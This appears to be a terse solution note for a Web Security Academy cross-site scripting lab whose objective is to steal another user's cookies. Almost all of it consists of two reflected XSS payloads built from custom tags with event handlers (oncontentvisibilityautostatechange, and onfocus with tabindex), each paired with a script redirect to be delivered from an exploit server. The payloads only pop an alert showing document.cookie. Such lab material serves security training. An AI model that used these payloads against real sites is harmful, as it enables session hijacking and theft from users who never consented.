**Objective: Steal cookies from other user using exploit server  
<br/>Payload #1:** <xss oncontentvisibilityautostatechange=alert(document[cookie]) style=display:block;content-visibility:auto>  
<br/>**In exploit sever deliver:**  
<script>location='[https://0a88000b048b371680d6031a001600a7.web-security-academy.net/?search=<xss+oncontentvisibilityautostatechange%3Dalert(document[cookie])+style%3Ddisplay%3Ablock%3Bcontent-visibility%3Aauto>](https://0a88000b048b371680d6031a001600a7.web-security-academy.net/?search=%3Cxss+oncontentvisibilityautostatechange%3Dalert%28document%5Bcookie%5D%29+style%3Ddisplay%3Ablock%3Bcontent-visibility%3Aauto%3E)';</script>  
<br/><br/>**Payload #2:** <xss id=x onfocus=alert(document.cookie) tabindex=1>#x  
<br/>**In exploit server deliver:**  
<script>  
location = '[https://0a88000b048b371680d6031a001600a7.web-security-academy.net/?search=<xss+id%3Dx+onfocus%3Dalert(document.cookie) tabindex=1>#x](https://0a88000b048b371680d6031a001600a7.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x)';  
</script>
